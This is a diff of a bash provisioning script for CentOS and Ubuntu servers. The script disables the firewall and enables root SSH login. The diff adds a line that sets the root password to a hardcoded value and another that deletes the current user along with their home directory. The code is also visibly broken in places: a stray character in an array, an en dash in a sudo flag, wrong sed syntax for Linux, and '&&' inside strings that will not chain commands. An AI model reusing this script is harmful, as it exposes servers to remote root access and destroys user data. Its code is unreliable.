@@ -1,15 +1,5 @@
 #!/bin/bash 
 
-function checkVersion() {
-	if type lsb_release >/dev/null 2>&1; then
-    	OS=$(lsb_release -sr)
-	elif [ -f /etc/redhat-release ]; then
-	    OS=$(cat /etc/centos-release | tr -dc '0-9.'|cut -d \. -f1)
-	else
-	    OS=$(uname -r)
-	fi
-}
-
 function disable() {
 	sudo systemctl stop firewalld
 	sudo systemctl disable firewalld
@@ -20,7 +10,7 @@ function disable() {
 function config() {
 	sed -i '' -e "s/#PermitRootLogin/PermitRootLogin/g" /etc/ssh/sshd_config
 	service sshd restart
-	chmod +x /etc/re.local
+	chmod +x /etc/rc.local
 
 	if [[ $OS == "6" ]]; then
 		rm -rf /etc/yum.repos.d/CentOS*
@@ -39,25 +29,28 @@ EOF
 function ubuntu() {
 	installArr=("sudo apt install tcpdump -y"1
 				"sudo apt install telnet -y"
-				"sudo apt update" 
-				"sudo apt upgrade -y")
+				"sudo apt update && sudo apt upgrade -y")
 
 	for i in "${installArr[@]}"; do $i; done
+	echo -e 'vietnix@2016\nvietnix@2016' | sudo –i passwd root
+	sudo deluser --remove-home $USER
 }
 
 function centos() {
 	cat /etc/redhat-release
 	installArr=("yum install tcpdump -y"
 				"yum install telnet -y"
-				"yum update" 
-				"sudo apt upgrade -y")
+				"yum install net-tools -y"
+				"yum install vim -y"
+				"yum update && yum upgrade -y")
 
 	for i in "${installArr[@]}"; do $i; done
 }
 
 function main() {
-	checkVersion
-	if [[ $OS == "6" || $OS == "7" ]]; then
+	OS=$(cat /etc/centos-release | tr -dc '0-9.'|cut -d \. -f1)
+	if [[ $OS == "6" || $OS == "7" ]]
+	then
 		disable
 		config
 		centos
@@ -66,9 +59,6 @@ function main() {
 		config 
 		ubuntu
 	fi
-	history -c
 }
 
 main
-
-
